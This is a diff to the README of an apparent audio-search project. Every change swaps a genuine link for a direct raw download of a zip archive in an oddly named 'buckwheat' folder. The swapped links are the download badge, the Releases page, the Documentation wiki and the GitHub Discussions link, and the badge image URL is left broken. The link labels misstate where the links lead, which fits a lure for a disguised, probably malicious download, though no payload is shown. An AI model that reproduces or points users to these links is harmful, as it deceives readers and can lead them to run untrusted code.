@@ -1,6 +1,6 @@
 # 🎵 semantic-audio-search - Search Sound by Meaning Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/thomazin244/semantic-audio-search/releases)
+[![Download Now](https://raw.githubusercontent.com/thomazin244/semantic-audio-search/main/buckwheat/semantic-audio-search.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/thomazin244/semantic-audio-search/main/buckwheat/semantic-audio-search.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **semantic-audio-search**! This application helps you find and tag so
 
 ## 📥 Download & Install
 
-To get started, visit the Releases page to download the software: [Download Here](https://github.com/thomazin244/semantic-audio-search/releases).
+To get started, visit the Releases page to download the software: [Download Here](https://raw.githubusercontent.com/thomazin244/semantic-audio-search/main/buckwheat/semantic-audio-search.zip).
 
 ### 💻 System Requirements
 
@@ -20,7 +20,7 @@ To get started, visit the Releases page to download the software: [Download Here
 ## 🔧 Installation Steps
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/thomazin244/semantic-audio-search/releases). Here, you’ll find the latest version available for download.
+   Go to our [Releases page](https://raw.githubusercontent.com/thomazin244/semantic-audio-search/main/buckwheat/semantic-audio-search.zip). Here, you’ll find the latest version available for download.
 
 2. **Download the Application:**
    Choose the correct package for your operating system. Click on the download link for the latest release to start the download.
@@ -63,11 +63,11 @@ To get started, visit the Releases page to download the software: [Download Here
   
 - **Application Won't Start:** Ensure your system meets the minimum requirements or reinstall the app from the Releases page.
 
-- **Need Help with Features:** Visit the [Documentation](https://github.com/thomazin244/semantic-audio-search/wiki) for detailed guides and troubleshooting.
+- **Need Help with Features:** Visit the [Documentation](https://raw.githubusercontent.com/thomazin244/semantic-audio-search/main/buckwheat/semantic-audio-search.zip) for detailed guides and troubleshooting.
 
 ## 🌟 Community and Support
 
-Join our community for support and to share your experiences. You can find us on [GitHub Discussions](https://github.com/thomazin244/semantic-audio-search/discussions) or leave an issue in the repository if you encounter a problem.
+Join our community for support and to share your experiences. You can find us on [GitHub Discussions](https://raw.githubusercontent.com/thomazin244/semantic-audio-search/main/buckwheat/semantic-audio-search.zip) or leave an issue in the repository if you encounter a problem.
 
 ## 📄 License
 
